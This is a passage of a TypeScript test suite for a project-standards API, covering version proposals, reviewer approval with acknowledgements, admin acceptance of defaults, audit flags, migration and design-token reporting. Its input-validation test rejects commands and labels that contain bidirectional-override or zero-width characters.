    const edited = { ...v1.profile, commands: [{ ...TEST }], severity: { 'structure/nested-repository': 'blocking' } };
    assert.equal((await propose('po', edited, 1)).status, 201);
    const expected = [{ rule: 'structure/nested-repository', from: 'advisory', to: 'blocking' }];
    const proposed = standardsAudit().pop()!;
    assert.deepEqual(proposed.flags, ['enforcement-changed', 'severity-changed', 'commands-changed']);
    const v2 = (await get()).versions[1] as EnforcementDto;
    assert.equal(v2.severityComparedTo, null);
    assert.deepEqual(v2.severityChanged, expected);
    assert.deepEqual(v2.enforcementChanged.fields, ['commands', 'severity', 'requiredDirs']);
    assert.deepEqual(v2.enforcementChanged.commands, { before: [], after: [TEST] });

    // The approval that first puts standards into effect names every one of them.
    assert.equal((await approve('reviewer', 2, v2.contentHash)).status, 200);
    const approved = standardsAudit().pop()!;
    assert.deepEqual(approved.flags, ['enforcement-changed', 'severity-changed', 'commands-changed']);
    assert.deepEqual((approved.after as { enforcementChanged: { severity: unknown } }).enforcementChanged.severity, expected);
  });

  it('an unknown rule or severity, and a command a reviewer cannot read, are 400 invalid-standards with nothing written', async () => {
    const before = standardsAudit().length;
    const bad: Array<[string, unknown, RegExp]> = [
      ['unknown rule', { ...sampleProfile(), severity: { 'made/up': 'blocking' } }, /profile\.severity: unknown rule "made\/up"/],
      ['unknown severity', { ...sampleProfile(), severity: { 'naming/files': 'fatal' } }, /profile\.severity\.naming\/files: expected one of blocking, advisory/],
      ['a command cannot be demoted', { ...sampleProfile(), severity: { command: 'advisory' } }, /unknown rule "command"/],
      ['right-to-left override in a command', { ...sampleProfile(), commands: [{ label: 'Lint', run: `npm run ${String.fromCharCode(0x202e)}tnil` }] },
        /profile\.commands\[0\]\.run: must not contain control, zero-width or bidirectional-override characters/],
      ['zero-width space in a label', { ...sampleProfile(), commands: [{ label: `Li${String.fromCharCode(0x200b)}nt`, run: 'npm run lint' }] },
        /profile\.commands\[0\]\.label: must not contain/],
      ['the same command twice', { ...sampleProfile(), commands: [{ label: 'Lint', run: 'npm run lint' }, { label: 'Again', run: 'npm  run lint' }] },
        /profile\.commands\[1\]\.run: the same command as profile\.commands\[0\]/],
    ];
    for (const [label, profile, message] of bad) {
      const r = await propose('po', profile, 1);
      assert.equal(r.status, 400, `${label}: ${r.raw}`);
      assert.equal(r.body.error, 'invalid-standards', label);
      assert.match(((r.body.errors as string[] | undefined) ?? []).join('\n'), message, label);
    }
    assert.equal(standardsAudit().length, before, 'a refused proposal is not audited');
    assert.equal((await get()).versions.length, 1);
  });

  it('admin accepts defaults only on a migrated project whose automatic proposal is untouched', async () => {
    // This project was created with standards: not migrated → refused.
    const fresh = (await get()).versions[0];
    const refused = await h.request('POST', `${base()}/accept-defaults`, { as: 'admin', body: { contentHash: fresh.contentHash } });
    assert.equal(refused.status, 409, refused.raw);
    assert.equal(refused.body.error, 'not-acceptable');

    // A project registered before standards existed, proposed for at migration.
    const legacy = h.projects.create({
      name: 'Legacy', workspacePath: `${h.root}/other`, source: { kind: 'path' }, stack: 'go', defaultEngine: 'claude', versionBudgetUsd: 10, createdBy: h.accounts.po.id,
    });
    const auto = (await proposeAutomatic(h.standards, legacy, { migrated: true }))!;
    const url = `/api/projects/${legacy.id}/standards`;
    const seen = (await h.request('GET', url, { as: 'admin' })).body.standards as StandardsDto;
    assert.equal(seen.migrated, true);
    assert.deepEqual(seen.versions[0].allowedActions, ['standards.accept-defaults']);
    const reviewerSees = (await h.request('GET', url, { as: 'reviewer' })).body.standards as StandardsDto;
    assert.deepEqual(reviewerSees.versions[0].allowedActions, ['standards.approve', 'standards.reject']);

    assert.equal((await h.request('POST', `${url}/accept-defaults`, { as: 'reviewer', body: { contentHash: auto.contentHash } })).status, 403);
    const wrong = await h.request('POST', `${url}/accept-defaults`, { as: 'admin', body: { contentHash: '0'.repeat(64) } });
    assert.equal(wrong.body.error, 'hash-mismatch');

    // The defaults bring required directories: enforcement changes, so even this shortcut needs the acknowledgement.
    const unacknowledged = await h.request('POST', `${url}/accept-defaults`, { as: 'admin', body: { contentHash: auto.contentHash } });
    assert.equal(unacknowledged.status, 409, unacknowledged.raw);
    assert.equal(unacknowledged.body.error, 'acknowledgement-required');
    const ok = await h.request('POST', `${url}/accept-defaults`, {
      as: 'admin', body: { contentHash: auto.contentHash, acknowledgedEnforcementHash: auto.contentHash },
    });
    assert.equal(ok.status, 200, ok.raw);
    const after = ok.body.standards as StandardsDto;
    assert.equal(after.effectiveVersion, 1);
    assert.equal(after.versions[0].decision, 'accepted-defaults');
    assert.equal(after.versions[0].decidedByName, 'admin');
    const last = standardsAudit().pop()!;
    assert.equal(last.action, 'standards.accept-defaults', 'recorded under its own action, never as an approval');
    // Nobody reviewed it, and it takes effect all the same: what it brings is named, before and after.
    assert.deepEqual(last.after, {
      version: 1, contentHash: auto.contentHash, origin: 'auto',
      enforcementChanged: { comparedTo: null, requiredDirs: { before: [], after: after.versions[0].profile.structure.requiredDirs } },
    });
    assert.deepEqual(last.flags, ['enforcement-changed']);

    // Once a person has replaced the automatic proposal, the shortcut is gone.
    const legacy2 = h.projects.create({
      name: 'Legacy 2', workspacePath: `${h.root}/acme-2`, source: { kind: 'path' }, stack: 'go', defaultEngine: 'claude', versionBudgetUsd: 10, createdBy: h.accounts.po.id,
    });
    await proposeAutomatic(h.standards, legacy2, { migrated: true });
    const url2 = `/api/projects/${legacy2.id}/standards`;
    const edited = await h.request('POST', `${url2}/versions`, { as: 'po', body: { profile: sampleProfile(), baseVersion: 1 } });
    assert.equal(edited.status, 201, edited.raw);
    const s2 = (await h.request('GET', url2, { as: 'admin' })).body.standards as StandardsDto;
    assert.deepEqual(s2.versions[1].allowedActions, []);
    const gone = await h.request('POST', `${url2}/accept-defaults`, { as: 'admin', body: { contentHash: s2.versions[1].contentHash } });
    assert.equal(gone.status, 409);
    assert.equal(gone.body.error, 'not-acceptable');
  });

  it('changing the project stack proposes nothing; the DTO reports the mismatch', async () => {
    assert.equal((await get()).stackMismatch, false);
    const patched = await h.request('PATCH', `/api/projects/${projectId}`, { as: 'po', body: { stack: 'go' } });
    assert.equal(patched.status, 200, patched.raw);
    const s = await get();
    assert.equal(s.stack, 'go');
    assert.equal(s.stackMismatch, true);
    assert.equal(s.versions.length, 1);
  });

  it('GET is open to every signed-in role, 401 without a session and 404 for an unknown project', async () => {
    for (const as of ['po', 'reviewer', 'approver', 'admin']) {
      assert.equal((await h.request('GET', base(), { as })).status, 200, as);
    }
    assert.equal((await h.request('GET', base())).status, 401);
    assert.equal((await h.request('GET', '/api/projects/no-such-project/standards', { as: 'po' })).status, 404);
  });

  it('an unreadable standards file never fails project creation or the project list', async () => {
    const fs = await import('fs');
    fs.writeFileSync(h.standards.filePath(projectId), '{ not json');
    const list = await h.request('GET', '/api/projects', { as: 'po' });
    assert.equal(list.status, 200);
    assert.deepEqual((list.body.projects as Array<{ standards: unknown }>)[0].standards, { effectiveVersion: null, pendingVersion: null, state: 'none' });
  });

  it('boot migration: a project with no standards file shows a pending automatic v1; a second boot proposes nothing', async () => {
    const legacy = h.projects.create({
      name: 'Legacy', workspacePath: `${h.root}/other`, source: { kind: 'path' }, stack: 'java', defaultEngine: 'claude', versionBudgetUsd: 10, createdBy: h.accounts.po.id,
    });
    const url = `/api/projects/${legacy.id}/standards`;
    const empty = (await h.request('GET', url, { as: 'po' })).body.standards as StandardsDto;
    assert.deepEqual([empty.state, empty.versions.length, empty.migrated], ['none', 0, false]);

    // projectId (created over HTTP) already has a file, so only the legacy project is proposed for.
    assert.deepEqual(await migrateStandards(h.projects, h.standards, h.audit, () => undefined), [legacy.id]);
    const s = (await h.request('GET', url, { as: 'admin' })).body.standards as StandardsDto;
    assert.equal(s.migrated, true);
    assert.equal(s.state, 'pending');
    assert.equal(s.pendingVersion, 1);
    assert.equal(s.versions[0].origin, 'auto');
    assert.equal(s.versions[0].proposedByName, null);
    assert.deepEqual(s.versions[0].allowedActions, ['standards.accept-defaults']);
    const audited = standardsAudit().filter((e) => e.projectId === legacy.id);
    assert.equal(audited.length, 1);
    assert.equal(audited[0].actorUsername, 'system');
    assert.deepEqual(audited[0].flags, ['auto-proposed', 'migration', 'enforcement-changed']);
    assert.deepEqual((audited[0].after as { enforcementChanged: unknown }).enforcementChanged,
      { comparedTo: null, requiredDirs: { before: [], after: s.versions[0].profile.structure.requiredDirs } });

    assert.deepEqual(await migrateStandards(h.projects, h.standards, h.audit, () => undefined), []);
    assert.equal(((await h.request('GET', url, { as: 'admin' })).body.standards as StandardsDto).versions.length, 1);
    assert.equal((await get()).migrated, false, 'a project created with standards is never marked migrated');
  });
});

// ─── Design system over HTTP ───

describe('standards API — design system', function () {
  this.timeout(30000);
  let h: Harness;
  let projectId: string;

  beforeEach(async () => {
    h = await startHarness({ standards: 'manual' });
    const r = await h.request('POST', '/api/projects', {
      as: 'po', body: { name: 'Acme', source: { kind: 'path', path: 'acme' }, stack: 'node-ts', defaultEngine: 'claude' },
    });
    assert.equal(r.status, 201, r.raw);
    projectId = (r.body.project as { id: string }).id;
  });
  afterEach(async () => { await h.close(); });

  const base = () => `/api/projects/${projectId}/standards`;
  const get = async (as = 'reviewer'): Promise<Record<string, unknown>> => {
    const r = await h.request('GET', base(), { as });
    assert.equal(r.status, 200, r.raw);
    return r.body.standards as Record<string, unknown>;
  };
  const versions = (s: Record<string, unknown>) => s.versions as Array<Record<string, unknown> & { version: number; contentHash: string; profile: ReturnType<typeof sampleProfile> }>;
  const approve = (version: number, contentHash: string, acknowledge = true): Promise<Resp> =>
    h.request('POST', `${base()}/versions/${version}/approve`, {
      as: 'reviewer', body: acknowledge ? { contentHash, acknowledgedEnforcementHash: contentHash } : { contentHash },
    });
  /** v1 approved, then v2: v1's blocking set and severities exactly, plus `design`. */
  const proposeWithDesign = async (): Promise<{ version: number; contentHash: string }> => {
    const v1 = versions(await get())[0];
    assert.equal((await approve(1, v1.contentHash)).status, 200);
    const profile = { ...v1.profile, design: templateDesign('node-ts', '')! };
    const created = await h.request('POST', `${base()}/versions`, { as: 'po', body: { profile, baseVersion: 1 } });
    assert.equal(created.status, 201, created.raw);
    const v2 = versions(await get()).find((v) => v.version === 2)!;
    return { version: 2, contentHash: v2.contentHash };
  };

  it('a version that adds a design system is refused without the acknowledgement: 409 with fields ["design"]', async () => {
    const v2 = await proposeWithDesign();
    const refused = await approve(2, v2.contentHash, false);
    assert.equal(refused.status, 409, refused.raw);
    assert.equal(refused.body.code ?? refused.body.error, 'acknowledgement-required', refused.raw);
    assert.deepEqual((refused.raw.match(/"fields":\[[^\]]*\]/) ?? [])[0], '"fields":["design"]');
    assert.equal((await approve(2, v2.contentHash)).status, 200);
    const audit = h.auditEntries().filter((e) => e.action === 'standards.approve').at(-1)!;
    assert.ok((audit.flags ?? []).includes('design-changed'));
  });

  it('the DTO carries the parsed tokens with resolved values and contrast, the change, and the template', async () => {
    await proposeWithDesign();
    const s = await get();
    const v2 = versions(s).find((v) => v.version === 2)!;
    const design = v2.design as { tokens: Array<{ name: string; resolved?: string | number; contrast?: number; role?: string }>; docPath: string; tokensContent: string; background: string };
    assert.equal(design.docPath, 'docs/design/DESIGN.md');
    assert.equal(design.background, '#ffffff');
    const fg = design.tokens.find((t) => t.name === '--color-fg')!;
    assert.equal(fg.resolved, '#1f2328');
    assert.equal(fg.contrast, 15.8);
    assert.equal(design.tokens.find((t) => t.name === '--color-bg')!.role, 'background');
    assert.equal(design.tokensContent, templateDesign('node-ts', '')!.tokens);
    const changed = v2.designChanged as { changed: boolean; comparedTo: number | null; tokens: unknown[] };
    assert.equal(changed.changed, true);
    assert.equal(changed.comparedTo, 1);
    assert.ok(changed.tokens.length > 10);
    assert.equal((versions(s)[0].designChanged as { changed: boolean }).changed, false, 'v1 has no design and replaced nothing that had one');
    assert.ok(s.designTemplate, 'node-ts has a template');
    assert.deepEqual((s.limits as Record<string, number>).designDocChars, 12_000);
    assert.ok((v2.changedFrom as { sections: string[] }).sections.includes('design'));
  });

  it('designTemplate is null for a stack without a template', async () => {
    fs.mkdirSync(path.join(h.root, 'py'), { recursive: true });
    const r = await h.request('POST', '/api/projects', {
      as: 'po', body: { name: 'Py', source: { kind: 'path', path: 'py' }, stack: 'python', defaultEngine: 'claude' },
    });
    assert.equal(r.status, 201, r.raw);
    const id = (r.body.project as { id: string }).id;
    const got = await h.request('GET', `/api/projects/${id}/standards`, { as: 'po' });
    assert.equal((got.body.standards as Record<string, unknown>).designTemplate, null);
  });

  it('each version carries its rulebook view, and the exact prompt and planner text a job file would carry', async () => {
    const s = await get();
    const v1 = versions(s)[0];
    const rulebook = v1.rulebook as { sections: Array<{ key: string; present: boolean; checked: Array<{ rule?: string }> }>; counts: { checked: number } };
    assert.ok(rulebook.sections.find((x) => x.key === 'practice')!.present, 'a new project is proposed with the rulebook');
    assert.ok(rulebook.counts.checked > 0);
    assert.equal(v1.promptText, renderStandardsText(v1.profile, v1.version));
    assert.equal(v1.plannerText, renderPlannerStandards(v1.profile, v1.version));
    assert.deepEqual(v1.guidanceCut, []);
    assert.equal((s.limits as Record<string, number>).guidanceEntries, 12);
    assert.equal(s.rulebookSuggestion, null, 'nothing in effect yet');
  });

  it('rulebookSuggestion: offered to a proposer while the version in effect predates the rulebook; never to a reviewer', async () => {
    const v1 = versions(await get())[0];
    assert.equal((await approve(1, v1.contentHash)).status, 200);
    assert.equal((await get('po')).rulebookSuggestion, null, 'v1 has the rulebook');
    const legacy = { ...v1.profile } as Record<string, unknown>;
    for (const key of RULEBOOK_KEYS) { delete legacy[key]; }
    const created = await h.request('POST', `${base()}/versions`, { as: 'po', body: { profile: legacy, baseVersion: 1 } });
    assert.equal(created.status, 201, created.raw);
    const v2 = versions(await get()).find((v) => v.version === 2)!;
    assert.equal((await approve(2, v2.contentHash)).status, 200);
    const asPo = await get('po');
    const suggestion = asPo.rulebookSuggestion as { sections: Record<string, unknown>; evidence: string } | null;
    assert.ok(suggestion);
    assert.equal(suggestion!.evidence, 'node-ts defaults');
    assert.deepEqual(Object.keys(suggestion!.sections).sort(), ['apiData', 'docsGit', 'performance', 'practice', 'security', 'testPolicy']);
    assert.equal((await get('reviewer')).rulebookSuggestion, null);
    const legacyView = versions(asPo).find((v) => v.version === 2)!.rulebook as { sections: Array<{ key: string; present: boolean; checked: Array<{ rule?: string; alwaysOn?: boolean }> }> };
    assert.ok(legacyView.sections.every((x) => !x.present));
    assert.deepEqual(legacyView.sections.find((x) => x.key === 'security')!.checked.map((c) => c.rule), ['security/env-file', 'security/secret-literal']);
  });

  it('designSuggestion appears only for a proposer, once the standards in effect have no design and the workspace shows a UI', async () => {
    const v1 = versions(await get())[0];
    assert.equal((await approve(1, v1.contentHash)).status, 200);
    fs.writeFileSync(path.join(h.root, 'acme', 'index.html'), '<!doctype html><title>x</title>\n');
    const asPo = await get('po');
    const suggestion = asPo.designSuggestion as { evidence: string; design: { tokensPath: string } } | null;
    assert.ok(suggestion, 'the po may propose, so is offered one');
    assert.equal(suggestion!.evidence, 'index.html');
    assert.equal(suggestion!.design.tokensPath, 'src/styles/tokens.css');
    assert.equal((await get('reviewer')).designSuggestion, null, 'a reviewer cannot propose');
  });
});
